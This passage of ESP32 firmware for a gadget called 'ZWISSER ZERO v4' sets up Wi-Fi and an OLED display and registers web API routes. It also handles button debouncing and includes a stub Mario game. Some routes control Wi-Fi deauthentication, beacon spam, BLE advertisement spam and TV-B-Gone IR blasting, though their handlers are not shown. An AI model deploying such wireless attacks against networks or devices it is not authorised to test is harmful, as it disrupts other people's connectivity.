           BTN_UP, BTN_DOWN, BTN_LEFT, BTN_RIGHT, BTN_CENTER);
    
    // Defer OLED boot screen update
    if (oledInitialized) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_5x7_tf);
        u8g2.drawStr(0, 16, "ZWISSER ZERO v4");
        u8g2.drawStr(0, 26, "Booting...");
        u8g2.drawStr(0, 36, "IR / BLE / WiFi");
        u8g2.sendBuffer();
    }

    irsend.begin();
    irrecv.setTolerance(25);
    irrecv.disableIRIn();
    irrecv.enableIRIn();
    addLog("[IR] Engine initialized (RX:GPIO%d TX:GPIO%d)", IR_RECEIVE_PIN, IR_SEND_PIN);

    float initTemp = temperatureRead();
    addLog("[SYS] Internal temp: %.1f C", (double)initTemp);

    if (staSsid.length() > 0 && staPass.length() > 0) {
        addLog("[WiFi] Attempting saved network: %s", staSsid.c_str());
        WiFi.mode(WIFI_AP_STA);
        WiFi.softAP(apSsid.c_str(), apPass.c_str());
        WiFi.begin(staSsid.c_str(), staPass.c_str());
        int attempts = 0;
        while (WiFi.status() != WL_CONNECTED && attempts < 15) { delay(500); attempts++; }
        if (WiFi.status() == WL_CONNECTED) {
            addLog("[WiFi] Connected to saved: %s (%s)", staSsid.c_str(), WiFi.localIP().toString().c_str());
        } else {
            addLog("[WiFi] Saved network failed: %s", staSsid.c_str());
            WiFi.softAPdisconnect(true);
            WiFi.mode(WIFI_AP);
            WiFi.softAP(apSsid.c_str(), apPass.c_str());
            addLog("[WiFi] AP only mode");
        }
    } else {
        WiFi.mode(WIFI_AP);
        WiFi.softAP(apSsid.c_str(), apPass.c_str());
        addLog("[WiFi] AP started: %s", apSsid.c_str());
    }

    deauthChannel = 1;

    // Update OLED with network info
    if (oledInitialized) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_5x7_tf);
        u8g2.drawStr(0, 14, "ZWISSER ZERO v4");
        char buf[24];
        snprintf(buf, sizeof(buf), "AP: %s", apSsid.c_str());
        u8g2.drawStr(0, 24, buf);
        if (WiFi.status() == WL_CONNECTED) {
            snprintf(buf, sizeof(buf), "IP: %s", WiFi.localIP().toString().c_str());
        } else {
            snprintf(buf, sizeof(buf), "IP: %s", WiFi.softAPIP().toString().c_str());
        }
        u8g2.drawStr(0, 34, buf);
        u8g2.drawStr(0, 48, "Made by Zalan Lykos");
        u8g2.drawStr(0, 56, "CENTER: Select");
        u8g2.sendBuffer();
        delay(1500);
    }

    server.on("/", handleRoot);
    server.on("/api/wifi/toggle", handleWifiToggle); server.on("/api/wifi/status", handleWifiStatus);
    server.on("/api/wifi/current", handleWifiCurrent); server.on("/api/wifi/config", handleWifiConfig);
    server.on("/api/wifi/scan", handleWifiScan); server.on("/api/wifi/connect", handleWifiConnect);
    server.on("/api/wifi/saved", handleWifiSaved); server.on("/api/wifi/connect_saved", handleWifiConnectSaved);
    server.on("/api/wifi/forget", handleWifiForget);
    server.on("/api/bt/toggle", handleBtToggle); server.on("/api/bt/status", handleBtStatus);
    server.on("/api/bt/scan", handleBtScan); server.on("/api/bt/name", handleBtName);
    server.on("/api/bt/pair", handleBtPair); server.on("/api/bt/paired", handleBtPaired);
    server.on("/api/bt/unpair", handleBtUnpair);
    server.on("/api/theme", handleTheme);
    server.on("/api/system/reboot", handleSystemReboot); server.on("/api/system/reset", handleSystemReset);
    server.on("/api/system/stats", handleSystemStats);
    server.on("/api/log", handleLog); server.on("/api/log/clear", handleLogClear);

    server.on("/api/deauth/start", handleDeauthStart); server.on("/api/deauth/stop", handleDeauthStop); server.on("/api/deauth/status", handleDeauthStatus);
    server.on("/api/beacon/start", handleBeaconStart); server.on("/api/beacon/stop", handleBeaconStop);
    server.on("/api/probe/start", handleProbeStart); server.on("/api/probe/stop", handleProbeStop); server.on("/api/probe/results", handleProbeResults);
    server.on("/api/hop/start", handleHopStart); server.on("/api/hop/stop", handleHopStop); server.on("/api/hop/status", handleHopStatus);
    server.on("/api/airtag/start", handleAirtagStart); server.on("/api/airtag/stop", handleAirtagStop);
    server.on("/api/smarttag/start", handleSmarttagStart); server.on("/api/smarttag/stop", handleSmarttagStop);
    server.on("/api/swiftpair/start", handleSwiftpairStart); server.on("/api/swiftpair/stop", handleSwiftpairStop);
    server.on("/api/gfp/start", handleGfpStart); server.on("/api/gfp/stop", handleGfpStop);
    server.on("/api/ibeacon/start", handleIbeaconStart); server.on("/api/ibeacon/stop", handleIbeaconStop);
    server.on("/api/eddystone/start", handleEddystoneStart); server.on("/api/eddystone/stop", handleEddystoneStop);
    server.on("/api/blespam/start", handleBleSpamStart); server.on("/api/blespam/stop", handleBleSpamStop);
    server.on("/api/blespam/stopall", handleStopAllBleSpam);
    server.on("/api/namerand/on", handleNameRandOn); server.on("/api/namerand/off", handleNameRandOff);

    server.on("/api/ir/scan", handleIrScan); server.on("/api/ir/last", handleIrLast);
    server.on("/api/ir/send", handleIrSend);
    server.on("/api/ir/tvbgone/start", handleTvbgoneStart); server.on("/api/ir/tvbgone/stop", handleTvbgoneStop);
    server.on("/api/ir/state", handleIrState);
    server.on("/api/ir/record", handleIrRecord);
    server.on("/api/ir/gree", handleIrGree);

    server.on("/api/remotes/load", handleRemotesLoad);
    server.on("/api/remotes/save", HTTP_POST, handleRemotesSave);
    server.on("/api/remotes/blast", HTTP_POST, handleRemotesBlast);

    server.on("/api/signals/load", handleSignalsLoad);
    server.on("/api/signals/save", HTTP_POST, handleSignalsSave);
    server.on("/api/signals/blast", HTTP_POST, handleSignalsBlast);

    server.on("/api/music/play", handleMusicPlay);
    server.on("/api/music/stop", handleMusicStop);
    server.on("/api/music/select", handleMusicSelect);
    server.on("/api/music/status", handleMusicStatus);

    server.onNotFound(handleRoot); server.begin();
    addLog("[SYS] Ready");
    
    // Show main menu on OLED after boot
    if (oledInitialized) {
        delay(500);
        oledNeedsRedraw = true;
        oledLastActivity = millis();
    }
}

// ===================== BUTTON READING ======================
void readButtons() {
    unsigned long now = millis();
    
    // Read raw values (LOW = pressed with INPUT_PULLUP)
    bool upRaw = digitalRead(BTN_UP);
    bool downRaw = digitalRead(BTN_DOWN);
    bool leftRaw = digitalRead(BTN_LEFT);
    bool rightRaw = digitalRead(BTN_RIGHT);
    bool centerRaw = digitalRead(BTN_CENTER);
    
    // Clear press flags at start of each read cycle
    btnUpPressed = false;
    btnDownPressed = false;
    btnLeftPressed = false;
    btnRightPressed = false;
    btnCenterPressed = false;
    
    // Debounce UP
    if (upRaw != btnUpLast) { btnUpDebounce = now; btnUpLast = upRaw; }
    if ((now - btnUpDebounce) > BTN_DEBOUNCE_MS && upRaw != btnUpState) {
        btnUpState = upRaw;
        if (btnUpState == LOW) btnUpPressed = true;
    }
    
    // Debounce DOWN
    if (downRaw != btnDownLast) { btnDownDebounce = now; btnDownLast = downRaw; }
    if ((now - btnDownDebounce) > BTN_DEBOUNCE_MS && downRaw != btnDownState) {
        btnDownState = downRaw;
        if (btnDownState == LOW) btnDownPressed = true;
    }
    
    // Debounce LEFT
    if (leftRaw != btnLeftLast) { btnLeftDebounce = now; btnLeftLast = leftRaw; }
    if ((now - btnLeftDebounce) > BTN_DEBOUNCE_MS && leftRaw != btnLeftState) {
        btnLeftState = leftRaw;
        if (btnLeftState == LOW) btnLeftPressed = true;
    }
    
    // Debounce RIGHT
    if (rightRaw != btnRightLast) { btnRightDebounce = now; btnRightLast = rightRaw; }
    if ((now - btnRightDebounce) > BTN_DEBOUNCE_MS && rightRaw != btnRightState) {
        btnRightState = rightRaw;
        if (btnRightState == LOW) btnRightPressed = true;
    }
    
    // Debounce CENTER
    if (centerRaw != btnCenterLast) { btnCenterDebounce = now; btnCenterLast = centerRaw; }
    if ((now - btnCenterDebounce) > BTN_DEBOUNCE_MS && centerRaw != btnCenterState) {
        btnCenterState = centerRaw;
        if (btnCenterState == LOW) btnCenterPressed = true;
    }
}

// ===================== MARIO GAME STUB IMPLEMENTATIONS =====================
// These stubs will be replaced with the full Mario game implementation.
// They exist to satisfy the linker while the game code is being developed.

struct MarioGame {
  bool started;
  bool paused;
  bool gameOver;
  bool won;
  int score;
  int lives;
  int world;
  int level;
  unsigned long centerHoldStart;
  bool centerHeld;
};

static MarioGame mario = {false, false, false, false, 0, 3, 1, 1, 0, false};

void marioStartGame() {
  mario.started = true;
  mario.paused = false;
  mario.gameOver = false;
  mario.won = false;
  mario.score = 0;
  mario.lives = 3;
  mario.world = 1;
  mario.level = 1;
  mario.centerHeld = false;
  mario.centerHoldStart = 0;
  oledNeedsRedraw = true;
  addLog("[MARIO] Game started - World %d-%d", mario.world, mario.level);
}

void marioExitGame() {
  mario.started = false;
  oledState.screen = MENU_GAMES;
  oledState.cursor = 0;
  oledNeedsRedraw = true;
  addLog("[MARIO] Exited to menu");
}

void marioHandleInput() {
  unsigned long now = millis();
  
  // Game over screen: CENTER exits to menu
  if (mario.gameOver) {
    if (btnCenterPressed) {
      marioExitGame();
    }
    return;
  }
  
  // Win screen: CENTER exits to menu
  if (mario.won) {
    if (btnCenterPressed) {
      marioExitGame();
    }
    return;
  }
  
  // CENTER button hold-to-pause detection
  bool centerStillHeld = (digitalRead(BTN_CENTER) == LOW);
  
  if (btnCenterPressed) {
    mario.centerHoldStart = now;
    mario.centerHeld = true;
  }
  
  if (mario.centerHeld) {
    if (centerStillHeld) {
      unsigned long holdMs = now - mario.centerHoldStart;
      if (mario.paused) {
        // When paused: hold 2s to exit to menu
        if (holdMs >= 2000) {
          mario.centerHeld = false;
          marioExitGame();
          return;
        }
      } else {
        // When playing: hold 1s to pause
        if (holdMs >= 1000) {
          mario.centerHeld = false;
          mario.paused = true;
          oledNeedsRedraw = true;
          return;
        }
      }
    } else {
      // Button released before hold threshold
      mario.centerHeld = false;
      if (mario.paused) {
        // Short tap while paused = resume
        mario.paused = false;
        oledNeedsRedraw = true;
        return;
      }
      // Short tap while playing = jump (handled below)
    }
  }
  
  if (mario.paused) return;
  
  // Short CENTER press = jump
  if (btnCenterPressed) {
    // Jump action (stub)
    oledNeedsRedraw = true;
    return;
  }
  
  // LEFT = move left
  if (btnLeftPressed) {
    oledNeedsRedraw = true;
  }
  
  // RIGHT = move right
  if (btnRightPressed) {
    oledNeedsRedraw = true;
  }
  
  // UP = jump buffer when moving, or climb/pipe when stationary
  if (btnUpPressed) {
    oledNeedsRedraw = true;
  }
  
  // DOWN = duck/fast fall
  if (btnDownPressed) {
    oledNeedsRedraw = true;
  }
}

void runMarioLoop() {
  if (!mario.started) return;
  if (mario.paused || mario.gameOver || mario.won) return;
  
  // Game tick (stub - will be filled with physics, AI, etc.)
  // For now, just ensure redraw happens periodically
  static unsigned long lastTick = 0;
  unsigned long now = millis();
  if (now - lastTick > 50) {
    lastTick = now;
    oledNeedsRedraw = true;
  }
}

void oledRenderMario() {
  u8g2.clearBuffer();
  
  // Draw a simple placeholder screen
  u8g2.setFont(u8g2_font_5x7_tf);
  char buf[24];
  
  // Draw ground
  u8g2.drawHLine(0, 56, 128);
  u8g2.drawBox(0, 57, 128, 7);
  
  // Draw Mario placeholder (simple stick figure)
  u8g2.drawBox(20, 44, 8, 12); // body
  u8g2.drawBox(22, 40, 4, 4);  // head
  
  // Draw some ground blocks
  for (int i = 0; i < 8; i++) {
    u8g2.drawFrame(i * 16, 48, 16, 8);
  }
  
  // Draw HUD
  snprintf(buf, sizeof(buf), "MARIO");
  u8g2.drawStr(0, 8, buf);
  snprintf(buf, sizeof(buf), "%06d", mario.score);
  u8g2.drawStr(0, 16, buf);
  
  snprintf(buf, sizeof(buf), "WORLD");
  u8g2.drawStr(64, 8, buf);
  snprintf(buf, sizeof(buf), "%d-%d", mario.world, mario.level);
  u8g2.drawStr(64, 16, buf);
  
  snprintf(buf, sizeof(buf), "LIVES");
  u8g2.drawStr(100, 8, buf);
  snprintf(buf, sizeof(buf), "x%d", mario.lives);
  u8g2.drawStr(100, 16, buf);
  
  // Paused overlay
  if (mario.paused) {
    u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.drawStr(40, 32, "PAUSED");
    u8g2.setFont(u8g2_font_4x6_tf);
    u8g2.drawStr(30, 40, "CENTER=Resume");
    u8g2.drawStr(30, 48, "HOLD 2s=Menu");
  }
  
  u8g2.sendBuffer();
}

void oledRenderMarioGameOver() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x7_tf);
  u8g2.drawStr(20, 30, "GAME OVER");
  char buf[16];
  snprintf(buf, sizeof(buf), "Score: %d", mario.score);
  u8g2.drawStr(20, 42, buf);
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.drawStr(20, 52, "CENTER=Menu");
  u8g2.sendBuffer();
}

void oledRenderMarioWin() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x7_tf);
  u8g2.drawStr(20, 30, "YOU WIN!");
  char buf[16];
  snprintf(buf, sizeof(buf), "Score: %d", mario.score);
  u8g2.drawStr(20, 42, buf);
  u8g2.setFont(u8g2_font_4x6_tf);
  u8g2.drawStr(20, 52, "CENTER=Menu");
  u8g2.sendBuffer();
}

void loop() {
    server.handleClient();
    runHackyLoop();
    runIrLoop();
    runMusicLoop();
    runTetrisLoop();
    runMarioLoop();
    if (coolBeGoneRunning) runCoolBeGone();
    updateBatteryReading();  // Read battery voltage periodically
    readButtons();
    oledHandleInput();
    oledUpdate();
    delay(2);
}
